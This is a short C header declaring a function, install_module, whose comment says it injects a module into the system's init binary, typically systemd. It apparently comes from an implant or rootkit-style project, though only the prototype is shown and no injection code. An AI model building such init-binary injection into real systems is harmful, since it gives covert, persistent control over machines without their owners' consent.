#include <elf.h>

/**
 * install_module - Install the module to the system
 *
 * This will inject this module to the init binary.
 * On most of the linux distributions, it is systemd.
 *
 * @module_start: Start address of the module
 * @module_end: End address of the module
 */
void install_module(const char module_start[], const char module_end[]);